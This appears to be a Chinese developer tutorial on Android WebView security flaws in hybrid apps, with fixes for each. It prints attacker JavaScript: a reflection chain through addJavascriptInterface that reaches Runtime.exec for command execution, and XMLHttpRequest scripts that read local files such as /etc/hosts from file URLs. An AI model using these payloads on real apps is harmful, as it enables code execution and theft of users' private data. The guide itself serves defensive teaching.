### 使用Hybrid开发，需要了解的webview那些漏洞
#### 类型
1. 任意代码执行漏洞
    - addJavascriptInterface（）
    - webview内置到处的searchBoxJavaBridge 对象
    - webview内置导出的accesssibility和accessibilityTraversalObject对象
2. 密码明文存储漏洞
3. 域控制不严格漏洞
#### 具体分析
1. 任意代码执行漏洞
    - addJavascriptInterface（）接口
        - 漏洞产生原因：
        ```
        webView.addJavascriptInterface(new JSObject(), "myObj");
        // 参数1：Android的本地对象
        // 参数2：JS的对象
        // 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法
        所以，漏洞产生的原因是：当js拿到android这个对象后，从而实现js调用android对象中所有的方法，包括系统类，从而进行任意代码执行。如可以执行命令获取本地设备的sd卡中的文件等信息从而造成信息泄露。
        ```
        - 具体获取系统类的描述（结合java反射机制）
            - android中的对象有一公共的方法：getClass();
            - 该方法可以获取到当前类 类型Class
            - 该类有一关键的方法：Class.forName()
            - 该方法可以加载一个类（java.lang.Runtime）
            - 而且该类是可以执行本地命令的
        - js攻击核心代码
            ```
                function execute(cmdArgs)  
                {  
                    // 步骤1：遍历 window 对象
                    // 目的是为了找到包含 getClass （）的对象
                    // 因为Android映射的JS对象也在window中，所以肯定会遍历到
                    for (var obj in window) {  
                        if ("getClass" in window[obj]) {  

                    // 步骤2：利用反射调用forName（）得到Runtime类对象
                            alert(obj);          
                            return  window[obj].getClass().forName("java.lang.Runtime")  

                    // 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令
                getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);  

                // 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。
                // 如执行完访问文件的命令之后，就可以得到文件名的信息了。
                        }  
                    }  
                }   
            ```
        - 当一些 APP 通过扫描二维码打开一个外部网页时，攻击者就可以执行这段 js 代码进行漏洞攻击。在微信盛行、扫一扫行为普及的情况下，该漏洞的危险性非常大
        - 具体解决方案:
            - 方案一：在Android 4.2 版本中规定对被调用的函数以 @JavascriptInterface进行注解从而避免漏洞攻击
            - 方案二：在Android 4.2版本之前采用拦截prompt（）进行漏洞修复。
                - 具体步骤：继承WebView，重写addJavascriptInterface（）方法，然后在内部自己维护一个对象映射关系的Map；将需要添加的js接口放入该map中
                - 每次当WebView加载页面前，加载一段本地代码的js代码。原理是：
                    - 让js调用一JavaScript方法：该方法是通过调用prompt()把js中的信息（含有特点标识，方法名称，参数等）传递到android端；
                    - 在android的onJsPrompt()中，解析传递过来的信息，再通过反射机制调用java对象的方法，这样实现安全的js调用android代码。
                    - 关于android返回给js的值：可以通过prompt（）把java中方法的处理结果返回到js中
    - webview内置到处的searchBoxJavaBridge_对象
        - 原因：在Android 3.0以下，Android系统会默认通过searchBoxJavaBridge_的Js接口给 WebView 添加一个JS映射对象：**searchBoxJavaBridge_对象**。该接口可能被利用，实现远程任意代码。
        - 解决方案：删除searchBoxJavaBridge_的js接口
        ```
            // 通过调用该方法删除接口
            removeJavascriptInterface（）；
        ```
    - webview内置导出的accesssibility和accessibilityTraversalObject对象
        - 同searchBoxJavaBridge_对象
2. 密码明文存储漏洞
    - WebView默认开启密码保存功能 ：mWebView.setSavePassword(true)`
    - 开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；如果选择”是”，密码会被明文保到 /data/data/com.package.name/databases/webview.db 中，这样就有被盗取密码的危险
    - 解决方案：关闭密码保存提醒，WebSettings.setSavePassword(false) 
3. 域控制不严格漏洞
    - 即 A 应用可以通过 B 应用导出的 Activity 让 B 应用加载一个恶意的 file 协议的 url，从而可以获取 B 应用的内部私有文件，从而带来数据泄露威胁。。具体：当其他应用启动此 Activity 时， intent 中的 data 直接被当作 url 来加载（假定传进来的 url 为 file:///data/local/tmp/attack.html ），其他 APP 通过使用显式 ComponentName 或者其他类似方式就可以很轻松的启动该 WebViewActivity 并加载恶意url。
    - 下面我们着重分析WebView中getSettings类的方法对 WebView 安全性的影响：
        - setAllowFileAccess（）
        ```
            // 设置是否允许 WebView 使用 File 协议
            webView.getSettings().setAllowFileAccess(true);     
            // 默认设置为true，即允许在 File 域下执行任意 JavaScript 代码；
            // 如果是false，则不会存在上述的威胁，但同时也限制了 WebView 的功能，使其不能加载本地的 html 文件
        ```
        使用 file 域加载的 js代码能够使用进行**同源策略跨域访问**，从而导致隐私信息泄露
        1. 同源策略跨域访问：对私有目录文件进行访问
        2. 针对IM类产品，泄漏的是聊天信息，以及联系人等
        3. 针对浏览器类软件，泄漏的是cookie信息
        4. 解决该问题方案：则需要对不使用file协议的业务启用，对使用file协议的禁用
        ```
            // 禁止 file 协议加载 JavaScript
            if (url.startsWith("file://") {
                setJavaScriptEnabled(false);
            } else {
                setJavaScriptEnabled(true);
            }
        ```
        - setAllowFileAccessFromFileURLs（）:设置是否允许通过 file url 加载的 Js代码读取其他的本地文件
            ```
                当AllowFileAccessFromFileURLs（）设置为 true 时，攻击者的JS代码为：
                <script>
                    function loadXMLDoc()
                    {
                        var arm = "file:///etc/hosts";
                        var xmlhttp;
                        if (window.XMLHttpRequest)
                        {
                            xmlhttp=new XMLHttpRequest();
                        }
                        xmlhttp.onreadystatechange=function()
                        {
                            //alert("status is"+xmlhttp.status);
                            if (xmlhttp.readyState==4)
                            {
                                console.log(xmlhttp.responseText);
                            }
                        }
                        xmlhttp.open("GET",arm);
                        xmlhttp.send(null);
                    }
                    loadXMLDoc();
                    </script>

                    // 通过该代码可成功读取 /etc/hosts 的内容数据
            ```
            - 解决方案：设置setAllowFileAccessFromFileURLs(false);当设置成为 false 时，上述JS的攻击代码执行会导致错误，表示浏览器禁止从 file url 中的 javascript 读取其它本地文件。
        - setAllowUniversalAccessFromFileURLs（）: 设置是否允许通过 file url 加载的 Javascript 可以访问其他的源(包括http、https等源)。// 在Android 4.1前默认允许（setAllowFileAccessFromFileURLs（）不起作用）// 在Android 4.1后默认禁止
            - ```
                当AllowFileAccessFromFileURLs（）被设置成true时，攻击者的JS代码是：
                // 通过该代码可成功读取 http://www.so.com 的内容
                    <script>
                    function loadXMLDoc()
                    {
                        var arm = "http://www.so.com";
                        var xmlhttp;
                        if (window.XMLHttpRequest)
                        {
                            xmlhttp=new XMLHttpRequest();
                        }
                        xmlhttp.onreadystatechange=function()
                        {
                            //alert("status is"+xmlhttp.status);
                            if (xmlhttp.readyState==4)
                            {
                                console.log(xmlhttp.responseText);
                            }
                        }
                        xmlhttp.open("GET",arm);
                        xmlhttp.send(null);
                    }
                    loadXMLDoc();
                    </script>
                解决方案：设置setAllowUniversalAccessFromFileURLs(false);
            ```
        - setJavaScriptEnabled（）:设置是否允许 WebView 使用 JavaScript（默认是不允许）.但很多应用（包括移动浏览器）为了让 WebView 执行 http 协议中的 JavaScript，都会主动设置为true，不区别对待是非常危险的。

    - 


#### 总结